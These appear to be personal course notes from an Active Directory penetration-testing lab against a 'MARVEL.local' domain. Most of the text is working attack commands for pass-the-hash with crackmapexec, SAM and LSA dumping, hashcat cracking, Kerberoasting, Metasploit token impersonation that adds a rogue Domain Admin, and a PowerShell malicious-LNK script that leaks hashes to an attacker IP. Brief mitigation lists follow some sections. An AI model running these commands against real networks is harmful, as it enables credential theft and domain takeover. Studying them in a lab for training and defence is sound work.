## Pass Attacks Overview

Pass the password/hash
When we crack the passwprd or can dump the SAM hashes

crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
Map every device that have the ability to accept a connection from the valid account (once we got that valid account) here over SMB. It checks if we have access and local admin on that machine ('Pwn3d' message).

If we do not have the password we can do the same thing with hashes. Once we got hashes for example using psexec on msfconsole and 'hashdump' once the meterpreter executed, or after executing secretsdump after mitm6 account creation.
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth 

Can also use crackmapexec to dump the SAM
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth --sam

Or enumerate shares and what shares are available on this device
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth --shares

Or dump local security authority
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth --lsa

We can also used several built-in modules
crakmapexec smb -L

For example to dump the lassy
crackmapexec smb 10.0.0.0/24 -u administrator -H HASH --local-auth -M lsassy
lsassy does store credentials used in real time

Difference d'utiliser --local-auth et -d ?

## Pass Attacks

crackmapexec --help
crackmapexec smb --help

Lab command:
crackmapexec smb 192.168.138.0/24 -u fcastle -d MARVEL.local -p Password1

Knowing where we can access, we will later on start dumping secrets using secretsdump.py

Lab command using hash (useful if hash cannot be cracked. NTLMv1 hash only. v2 can be relayed):
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth

Dump SAM base once a connection is validated:
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --sam
SAM base is added to working database

Enumerate the shares:
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --shares

LSA for secret dump :
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth --lsa
Keep secrets but some passwords and so hashes might have been changed and are not valid anymore

Modules:
List modules
crackmapexec smb -L

Use module lsassy
crackmapexec smb 192.168.138.0/24 -u administrator -H HASH-V1 --local-auth -M lsassy
If any secret is stored in memory we may be able to see that

Crackmapexec database:
cmedb
help
host //all host pulled in the network
creds // all the creds we found and on what they work

## Dumping and Cracking Hashes

secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.138.137
We want SAM hashes, administrators and user account. No focus on default accounts

Sometime we can have clear password if they are stored in registries or if using wdigest

wdigest is an older protocol (Win7,8,Server2012). They patched it by disabling it.
We can force wdigest activation and wait for a login to get clear password.

Knowing we are admins on several machines thanks to crackmapexec we try dumping on all machines for additional hashes. if no access by password we can try using hash:
secretsdump.py aministrator@192.168.138.138 -hashes NTLM_HASH

LLMNR to get hash -> fcastle hash -> cracked -> sprayed the password -> found new login -> secretsdump those logins -> respray the network with local account
And all we need to crack the hash is the NT portion of the hash, not the LM

Crack NT hash: 
- Determine hash type using hash-identifier from SAM dumped secrets
- Find appropiate hashcat attack:
hashcat --help | grep NTLM
hashcat -m 1000 NT_HASH /usr/share/wordlists/rockyou.txt -O
-O : Optimized if on bare-metal

## Pass Attack Mitigation

- Avoid re-using local admin password
- Disable Guest and Administrators accounts
- Limit administrators (least privilege)
- Utilise strong password without common words (can use sentence)
Set check-in and check-out on sensitive accounts when needed. Automatically rotate password on check in/out

## Kerberoasting Overview

This attack takes advantages of service attack
We provide a TGT request to the DC to obtain access to an Application Server (provide NTLM hash).
Once server answered we request a TGS for server to the DC.
At step 4 we receive a TGS encrypted with server's account hash from DC.
Once we have a valid TGT from a compromised/possessed domain account, then we can request the TGS that is going to have the hash of service account.
We can use GetUserSPNs.py to use our username and password, point to the domain controller that is our KDC and issue a request, gather the hash and crack it.

## Kerberoasting Walkthrough

SPN = Service Principal Name
Using a compromise account on the DC we can initiate a request using this command
sudo GetUserSPNS.py MARVEL.local/fcastle:Password -dc-p 192.168.132.136 -request

From result grab krb hash and put it in krb.txt file
hashcat -m 13100 krb.txt /usr/share/wordlist/rockyou.txt

## Kerberoastin Mitigation

- Do not run the service account as admin
- Service account should have strong password
- Do not mark password account in account description

## Token Impersonation Overview

A token is a temporary key that allow to access a system/network without having to provide credentials each time
Two types :
- Delegate : creating for logging
- Impersonation : non-interactive such as attacking a network drive

Within metasploit we can use module 'incognito' to impersonate token in meterpreter (admin must be logged to the machine):
load incognito
list_tokens -u
impersonate_token marvel\\castle
shell

If we impersonate a domain admin token, we can manage to execute succesffullu Mimikatz attack that would failed without this domain admin impersonation.

It can be used to dump hashes as we impersonate admin domain account.

It can also be used to create a new domain user using net user /add for example

## Token Impersonation Walkthrough

Can also use Mimikatz, msfconsole

msfconsole
search psexec
use exploit/windows/smb/psexec
options
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS 192.168.138.137
set smbuser fcastle
set smbpass Password1
set smbdomain MARVEL.local
options
run

shell
whoami
^C

load incognito (while having admin domain account logged in)
list_tokens -u
impersonate_token marvel\\fcastle
shell
whoami
^C
rev2self (reset to normal)
getuid

Backbefore leaving with ^C we can add an user in the domain
net user /add kawkeye Password1@ /domain
net group "Domain Admins" hawkeye /ADD /DOMAIN // user is added to domain group 

Can check user is properly added using :
secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.138.136

## Token Impersonation Mitigation

- Limit user/group token creation permission
- Local admin restrictions

## LNK File Attacks

if we have access a file share we can drop a malicious file into it using it.
We can use powershell to generate the file, and if the file is trigger we can capture a hash :
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.138.149\@test.png" //address of attack machine that is going to be accessed
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()

File tries to trigger a png image but is pointing back to our attacker machine and it help to get that hash using responder from attacker machine

Lab : we execute the powershell

On attacker machine :
sudo resonder -I eth0 -dP

Can also use netexec to drop the file from attacker machine:
netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149
Slinky is a module that will download the file test on the accessible share on the specified machine.

## GPP / cPassword Attacks and Mitigations

Group Policy Preferences allowed admins to create policies using embedded credentials.
These credentials were encrypted and places in a "cPassword". Key got released accidentally, patched but can still be found.

In some filses if we find cPassword field (xml), use gpp-decrypt tool

Mitigation is to patch (KB2962486) and elete the old GPP XML

## Mimikatz Overview

Tool used to view and steal credentials, generate Kerberos tickets
Dump credentials stored in memory.
